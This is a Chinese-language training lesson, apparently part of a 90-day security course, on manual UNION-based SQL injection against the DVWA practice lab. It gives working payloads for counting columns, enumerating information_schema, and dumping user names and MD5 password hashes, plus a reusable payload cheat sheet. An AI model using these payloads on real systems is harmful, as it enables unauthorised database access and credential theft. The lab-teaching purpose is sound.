---
title: Day016：SQL 注入 - 手工注入技术
tags:
  - 网络安全
  - SQL注入
  - 手工注入
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d016
date: 2026-02-07
updated: 2026-01-28
---

# Day016：SQL 注入 - 手工注入技术

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 3：SQL 注入入门 |
| **今日主题** | 手工注入：从判断到获取数据 |
| **预计时间** | 2.5 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你确认了一个页面存在 SQL 注入，输入 `1'` 会报错。但怎么利用这个漏洞获取数据库里的信息呢？
>
> **问题**：知道有漏洞，但不知道怎么"挖数据"。
>
> **今天的任务**：学会手工注入的完整流程，一步步把数据库内容"偷"出来。

---

## 今日目标

- [ ] 判断注入类型（数字型 vs 字符型）
- [ ] 使用 ORDER BY 判断列数
- [ ] 使用 UNION SELECT 获取数据
- [ ] 获取数据库名、表名、列名

**闯关条件**：从 DVWA 中获取 users 表的用户名和密码哈希。

---

## 实战任务（先动手！）

### 任务 1：判断注入类型（15 分钟）

打开 DVWA 的 SQL Injection 页面，安全级别设为 Low。

**数字型 vs 字符型**：

| 输入 | 数字型 SQL | 字符型 SQL |
|------|------------|------------|
| `1` | `WHERE id = 1` | `WHERE id = '1'` |
| `1'` | 报错 | 报错 |
| `1 AND 1=1` | 正常 | 可能正常 |
| `1' AND '1'='1` | 报错 | 正常 |

**测试步骤**：
```
输入 1      → 正常返回
输入 1'     → 报错（有注入）
输入 1' AND '1'='1  → 正常返回（字符型）
```

DVWA 的这个注入点是**字符型**。

---

### 任务 2：判断列数（15 分钟）

使用 `ORDER BY` 判断 SELECT 语句返回多少列：

```
1' ORDER BY 1 --    → 正常
1' ORDER BY 2 --    → 正常
1' ORDER BY 3 --    → 报错！
```

**结论**：查询返回 2 列。

**原理**：`ORDER BY 3` 试图按第 3 列排序，但只有 2 列，所以报错。

---

### 任务 3：UNION SELECT 获取数据（30 分钟）

**UNION 规则**：两个 SELECT 的列数必须相同。

我们知道有 2 列，构造 payload：

```
1' UNION SELECT 1,2 --
```

页面会显示 `1` 和 `2`，说明这两个位置可以回显数据！

**获取数据库版本和用户**：
```
1' UNION SELECT version(),user() --
```

**获取当前数据库名**：
```
1' UNION SELECT database(),2 --
```

记下数据库名：`dvwa`

---

### 任务 4：获取表名（15 分钟）

MySQL 的 `information_schema` 数据库存储了所有元数据。

```
1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa' --
```

你会看到：`guestbook` 和 `users`

我们要的是 `users` 表！

---

### 任务 5：获取列名（15 分钟）

```
1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --
```

你会看到：`user_id`, `first_name`, `last_name`, `user`, `password`, `avatar` 等。

关键列：`user` 和 `password`！

---

### 任务 6：获取用户数据（15 分钟）

```
1' UNION SELECT user,password FROM users --
```

**恭喜！你拿到了所有用户名和密码哈希！**

示例结果：
```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
gordonb | e99a18c428cb38d5f260853678922e03
```

这些是 MD5 哈希，可以用在线工具破解。

---

## 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 判断出注入类型（字符型） | |
| 使用 ORDER BY 判断列数为 2 | |
| UNION SELECT 显示数据库版本 | |
| 获取到表名 users | |
| 获取到 user 和 password 列的数据 | |

---

## 底层补课

### UNION 注入原理

**UNION** 将两个 SELECT 的结果合并：
```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2
```

要求：两个 SELECT 返回的**列数必须相同**。

### information_schema 数据库

MySQL 5.0+ 内置的数据库，存储所有元信息：

| 表 | 内容 |
|----|------|
| `schemata` | 所有数据库名 |
| `tables` | 所有表名 |
| `columns` | 所有列名 |

**常用查询**：
```sql
-- 获取所有数据库
SELECT schema_name FROM information_schema.schemata

-- 获取某库的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa'

-- 获取某表的所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### 手工注入完整流程

```
1. 判断是否有注入（加单引号）
2. 判断注入类型（数字/字符）
3. 判断列数（ORDER BY）
4. 确定回显位置（UNION SELECT 1,2,3...）
5. 获取数据库名（database()）
6. 获取表名（information_schema.tables）
7. 获取列名（information_schema.columns）
8. 获取数据（UNION SELECT 列名 FROM 表名）
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 列数不对 | UNION SELECT 报错 | 重新用 ORDER BY 确认列数 |
| 引号没闭合 | SQL 语法错误 | 确保注入语句完整闭合原语句 |
| 注释符错误 | 后面的内容没被注释 | MySQL 用 `--` 后要加空格，或用 `#` |
| 没有回显 | 看不到结果 | 可能是盲注，或回显位置不对 |

---

## 知识卡片速查

### 手工注入 Payload 模板

```sql
-- 判断列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (直到报错)

-- 确定回显位
' UNION SELECT 1,2,3--

-- 获取数据库信息
' UNION SELECT version(),database()--
' UNION SELECT user(),@@datadir--

-- 获取表名
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--

-- 获取列名
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--

-- 获取数据
' UNION SELECT user,password FROM users--
```

### 常用 MySQL 函数

| 函数 | 作用 |
|------|------|
| `version()` | 数据库版本 |
| `database()` | 当前数据库 |
| `user()` | 当前用户 |
| `@@datadir` | 数据目录 |
| `@@hostname` | 主机名 |

---

## 常见问题

**Q1：为什么我的 UNION SELECT 报错？**

A1：最常见原因是列数不对。UNION 两边的 SELECT 必须返回相同列数。用 ORDER BY 重新确认列数。

**Q2：注释符 `--` 后面为什么要加空格？**

A2：MySQL 要求 `--` 后必须有空格或其他字符。在 URL 中空格会被编码，可以用 `--+`（`+` 会被解码为空格）或用 `#`（URL 编码为 `%23`）。

**Q3：如果数据库不是 MySQL 怎么办？**

A3：不同数据库语法略有不同：
- PostgreSQL：`version()`、`current_user`
- Oracle：`SELECT * FROM dual`、`SELECT banner FROM v$version`
- SQL Server：`@@version`、`db_name()`

---

## 明日预告

**Day 017：SQL 注入 - SQLMap 自动化**

明天你将：
- 学习使用 SQLMap 自动检测和利用 SQL 注入
- 一键获取数据库结构和数据
- 了解 SQLMap 的常用参数

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你完成了手工注入全流程——从判断到拿数据。
>
> 手工注入虽然慢，但这是理解 SQL 注入原理的最好方式。
>
> 你要知道**为什么**这些 payload 能工作，而不只是复制粘贴。
>
> 明天我们学 SQLMap，那是自动化工具。但记住：**工具只是加速器，原理才是根基**。

```bash
echo "Day 016 Complete! 我会手工注入了！"
```
